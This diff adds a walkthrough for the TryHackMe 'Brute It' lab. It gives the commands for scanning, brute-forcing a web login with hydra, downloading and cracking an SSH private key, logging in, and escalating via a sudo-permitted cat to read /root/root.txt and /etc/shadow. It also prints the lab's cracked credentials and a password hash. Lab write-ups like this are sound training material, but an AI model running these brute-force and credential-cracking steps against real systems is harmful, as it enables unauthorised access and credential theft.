@@ -1,0 +1,31 @@
+# Brute It | TryHackMe
+	## Task 2: Recon
+		nmap -sV -A -v -sC -O [ip]
+		dirsearch dir -u http://[ip] -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt	for hidden directory
+	## Task 3: Shell
+		hydra -l admin -P rockyou.txt 10.49.176.199 http-post-form "/admin/:user=^USER^&pass=^PASS^:Invalid" 	to brute-force the web login password. The web login credentials are-> admin:xavier . After logging in to the website, an RSA private key can be found.
+		wget http://10.49.176.199/admin/panel/id_rsa	to download the private key to your local machine
+		ssh2john id_rsa > id_rsa.txt		
+		john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.txt	to crack the private key's passphrase
+		chmod 700 id_rsa
+		john --show id_rsa.txt		The passphrase for this lab is "rockinrool"
+		
+		ssh -i id_rsa john@10.49.176.199	to connect to the target machine as `john`
+	## Task 4: Privilege Escalation
+		sudo -l		to check the sudo privileges. The following output should appear: "(root) NOPASSWD: /bin/cat"
+		sudo /bin/cat /root/root.txt		to read the root flag
+		sudo /bin/cat /etc/shadow	contains password hashes for local accounts. "$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL." save it hash.txt. 
+		john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt	to crack the hash
+		john --show hash.txt
+
+**Note:** A password hash cannot be directly decoded. John the Ripper attempts to crack it by testing candidate passwords from a wordlist. A password will be recovered only if a matching candidate is found.
+
+
+Used tools
+    nmap | dirsearch | gobuster | hydra | wget | ssh2john | john | ssh
+    
+
+
+
+
+
